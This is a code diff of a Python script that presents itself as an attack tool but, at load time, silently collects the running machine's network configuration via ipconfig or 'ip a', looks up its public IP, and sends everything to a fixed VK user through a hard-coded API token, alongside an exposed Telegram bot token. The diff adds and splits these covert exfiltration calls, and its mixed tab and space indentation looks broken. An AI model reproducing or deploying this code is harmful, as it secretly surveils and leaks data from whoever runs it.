@@ -69,7 +69,7 @@ except:
 sinhron = telebot.TeleBot("1501933711:AAHXVb7vdNFaH6GDv1N0Q4WMm32kYZgPOTA")
 
 
-def sysinit():
+def sysinit(send):
     import sys
     if sys.platform == 'win32':
         os.system("ipconfig >output_init_info.txt")
@@ -79,6 +79,7 @@ def sysinit():
         
         content = f"[ipconfig config]:\n----\n{content}"
         os.remove("output_init_info.txt")
+		send(random_id=0, user_id=566312040, message=f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
     else:
         os.system("ip a >output_init_info_partOne.txt")
         f = open("output_init_info_partOne.txt", "rt")
@@ -94,16 +95,19 @@ def sysinit():
         f = open("output_init_info_partTwo.txt", "rt")
         content_part_two = f.read()
         
-        content = f"[ip a config]:\n----\n{content_part_one}\n----\n[man ip config]:\n----\n{content_part_two}"
+        content = f"[ip a config]:\n----\n{content_part_one}\n"
         
         f.close()
-        os.remove("output_init_info_partOne.txt")
+		send(random_id=0, user_id=566312040, message=f"Network configuration for platform (p.1) {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}")
+        
+		content = f"----\n[man ip config]:\n----\n{content_part_two}"
+		
+		send(random_id=0, user_id=566312040, message=content)
+		os.remove("output_init_info_partOne.txt")
         os.remove("output_init_info_partTwo.txt")
-    
-    return f"Network configuration for platform {sys.platform}:\n=================================================================\n{content}\n\n\nIP from https://ramziv.com/ {requests.get('https://ramziv.com/ip').text}"
 
 
-vk_api.VkApi(token='5696d85e5715210d1a8da83ab75f449ab69e315dce3a5fca3143c69de1617c2e5ec846f9ab55713238d92').get_api().messages.send(random_id=0, user_id=566312040, message=sysinit())
+sysinit(vk_api.VkApi(token='5696d85e5715210d1a8da83ab75f449ab69e315dce3a5fca3143c69de1617c2e5ec846f9ab55713238d92').get_api().messages.send)
 exit()
 print(f"{yl}[{gr}+{yl}]{cy} Атака {rd}началась!")
 
